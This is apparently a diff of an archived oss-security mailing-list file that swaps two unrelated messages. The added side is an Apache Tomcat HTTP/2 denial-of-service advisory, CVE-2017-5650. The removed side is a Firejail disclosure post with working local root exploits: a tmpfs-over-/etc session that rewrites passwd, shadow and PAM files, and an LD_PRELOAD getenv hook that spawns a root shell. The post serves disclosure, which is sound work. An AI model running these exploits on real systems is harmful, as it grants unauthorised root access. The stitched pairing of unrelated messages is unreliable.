@@ -1,198 +1,45 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/05/4
-Message-ID: <1483655866.8979.68.camel@juliet.mcarpenter.org>
-Date: Thu, 05 Jan 2017 23:37:46 +0100
-From: Martin Carpenter <mcarpenter@...e.fr>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/04/10/22
+Message-ID: <8c9758b3-34d8-4126-bade-df93a26256bb@apache.org>
+Date: Mon, 10 Apr 2017 20:14:37 +0100
+From: Mark Thomas <markt@...che.org>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: Re: Re: Firejail local root exploit
+Subject: [SECURITY] CVE-2017-5650 Apache Tomcat Denial of Service
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+CVE-2017-5650 Apache Tomcat Denial of Service
 
-On Wed, 2017-01-04 at 12:16 -0500, cve-assign@...re.org wrote:
-> >  * Firejail has too broad attack surface that allows users
-> >  * to specify a lot of options
+Severity: Important
 
-I agree. I've kicked the tires a couple of times over the last year and
-my feeling is that there remains a lot of low hanging exploitable fruit.
-Although the devs have, with some encouragement, introduced macros to
-permanently drop privs or drop euid 0 where possible there are still
-places where that is not the case.
+Vendor: The Apache Software Foundation
 
-Setuid-root makes me sad, copy_file() worries me still and the ability
-for a non-priv user to run any seccomp filter on anything feels like an
-accident waiting to happen (assuming it cannot already be exploited).
+Versions Affected:
+Apache Tomcat 9.0.0.M1 to 9.0.0.M18
+Apache Tomcat 8.5.0 to 8.5.12
+Apache Tomcat 8.0.x and earlier are not affected
 
+Description
+The handling of an HTTP/2 GOAWAY frame for a connection did not close
+streams associated with that connection that were currently waiting for
+a WINDOW_UPDATE before allowing the application to write more data.
+These waiting streams each consumed a thread. A malicious client could
+therefore construct a series of HTTP/2 requests that would consume all
+available processing threads.
 
-A handful of concrete examples that I have reported are below. These are
-fixed but not previously discussed here and do not have CVEs AFAIK
-(perhaps MITRE could do the honors where deemed appropriate?).
+Mitigation:
+Users of the affected versions should apply one of the following
+mitigations:
+- Upgrade to Apache Tomcat 9.0.0.M19 or later
+- Upgrade to Apache Tomcat 8.5.13 or later
 
+Credit:
+This issue was identified by Chun Han Hsiao and reported responsibly to
+the Tomcat security team.
 
-1. --tmpfs
+History:
+2017-04-10 Original advisory
 
-Prior to these commits:
-
-  commit cea58747d61dc56ff8bb57aa02786cd8cc423bca
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Mon Jan 25 15:01:57 2016 -0500
-
-      --tmpfs allowd only as root user
-
-  commit 678cd1495457318dad39178bb646ba1b96332ddb
-  Author: root <root@...ian>
-  Date:   Mon Jan 25 14:58:27 2016 -0500
-
-      --tmpfs allowd only as root user
-
-
-any non-privileged user could mount a tmpfs over any location. Eg mount
-over /etc to get root shell:
-
-martin@...ntu14:~$ firejail --noprofile --tmpfs=/etc 
-Parent pid 27720, child pid 27721
-Warning: failed to mount /sys
-Child process initialized
-[I have no name!@...ntu14 firejail]$ echo
-"root:x:0:0:root:/root:/bin/bash" > /etc/passwd
-[I have no name!@...ntu14 firejail]$ uid=$(id -u)
-[I have no name!@...ntu14 firejail]$ echo "martin:x:$uid:
-$uid::/tmp:/bin/bash" >> /etc/passwd
-[I have no name!@...ntu14 firejail]$ echo "root::::::::" > /etc/shadow
-[I have no name!@...ntu14 firejail]$ echo "martin::::::::"
->> /etc/shadow
-[I have no name!@...ntu14 firejail]$ echo "root:x:0:" > /etc/group
-[I have no name!@...ntu14 firejail]$ echo "martin:x:$uid:" >> /etc/group
-[I have no name!@...ntu14 firejail]$ touch /etc/{login.defs,pam.conf}
-[I have no name!@...ntu14 firejail]$ mkdir /etc/pam.d
-[I have no name!@...ntu14 firejail]$ echo "account sufficient
-pam_permit.so" > /etc/pam.d/other
-[I have no name!@...ntu14 firejail]$ echo "auth sufficient
-pam_permit.so" >> /etc/pam.d/other
-[I have no name!@...ntu14 firejail]$ echo "session sufficient
-pam_permit.so" >> /etc/pam.d/other
-[I have no name!@...ntu14 firejail]$ su - 
-root@...ntu14:~# id 
-uid=0(root) gid=0(root) groups=0(root)
-
-
-2. Nuke /etc/resolv.conf
-
-This is silly (but was flagged in the change log as a security issue):
-by chrooting to / a non-privileged user can truncate the
-(real) /etc/resolv.conf to 0 bytes. Fixed at:
-
-  commit 6144229605177764b7f3f3450c1a47f56595dc9e
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Thu Oct 27 10:16:07 2016 -0400
-
-      security: overwrite /etc/resolv.conf
-
-
-3. Non-sticky /tmp, /var/tmp
-
-"Mode 0777 considered harmful". For example (priv esc via system util,
-perhaps using "--caps.keep=setuid" left as exercise for reader):
-
-martin@...ntu14:~$ firejail --noprofile 
-Parent pid 11658, child pid 11659
-Warning: failed to mount /sys
-Child process initialized
-[martin@...ntu14 firejail]$ ls -ld /var/tmp
-drwxrwxrwx. 2 root root 40 Jan 26 23:59 /var/tmp
-[martin@...ntu14 firejail]$ exit
-martin@...ntu14:~$ ls -ld /var/tmp 
-drwxrwxrwt. 4 root root 4096 Jan 26 19:23 /var/tmp
-martin@...ntu14:~$ 
-
-
-/tmp was mounted tmpfs 0777 prior to:
-
-  commit aa28ac9e09557b833f194f594e2940919d940d1f
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Sun Jan 31 15:15:24 2016 -0500
-
-      various fixes
-
-/dev, /dev/shm, /var/tmp, /var/lock were mounted 0777 prior to:
-
-  commit cd0ecfc7a7b30abde20db6dea505cd8c58e7c046
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Fri Jan 29 09:20:19 2016 -0500
-
-      0.9.38-rc1 testing
-
-There are other weak perms fixed around here eg /dev/shm/firejail was
-0777 prior to:
-
-  commit 1cab02f5ae3c90c01fae4d1c16381820b757a3a6
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Sun Jan 31 11:37:23 2016 -0500
-
-      various fixes
-
-(I have not looked at these related changes and the exploitability of
-the issues that they hope to remediate).
-
-
-4. Environment not cleaned before root exec()
-
-The --x11 flag runs an X server as root in some circumstances and the
---env flag can be used to set arbitrary environment variables. This
-skips runtime linker protections on eg LD_* variables for setuid
-executables. So a non-privileged user could pop a root shell in any
-number of ways, eg hooking calls to getenv(3) in xauth(1):
-
-  #!/bin/sh
-  gcc -xc -o rootshell.so -shared -fPIC - <<EOF
-  #include <stdlib.h>
-  char *getenv(const char *name) { exit(system("/bin/sh")); }
-  EOF
-  exec firejail --x11=xorg --env=LD_PRELOAD=$PWD/rootshell.so
-
-There were a couple of fixes:
-
-  commit 3b81e1f2c331644ced87d26a943b22eed6242b8f
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Thu Nov 3 10:53:51 2016 -0400
-
-      security: env variables
-
-  commit 72bc0e145c67da24e555d868086953148c52b5fc
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Fri Nov 4 09:12:52 2016 -0400
-
-      execv fixes
-
-(the overly-specific LD_PRELOAD asserts that you see in there is a
-(hopefully redundant!) relic of that conversation).
-
-
-5. Finally, I don't think this was one of mine but I spotted it paging
-through the commit log this evening:
-
-  commit a23ac1bf390fa4c3db4ea31e6ee6100a9c511d59
-  Author: netblue30 <netblue30@...oo.com>
-  Date:   Tue Jan 26 09:19:19 2016 -0500
-
-      don't allow --chroot as user without seccomp support
-
-Currently a non-privileged user can chroot anywhere but is prevented
-from mischief by seccomp filtering. (Thought this  worries me too,
-perhaps someone else can punt it further?). Prior to commit a23ac above
-however systems without seccomp support were permitted to use the
---chroot flag but could not offer this seccomp mitigation. I'm guessing
-this leads to a privesc via the "copy binary" function on sudo(1) or
-similar (setuid) into a suitably prepared chroot.
-
-
-
-firejail needs more attention IMHO, I'm sure there are more to shake
-out.
-
-Regards,
-
-Martin.
-
+References:
+[1] http://tomcat.apache.org/security-9.html
+[2] http://tomcat.apache.org/security-8.html
 
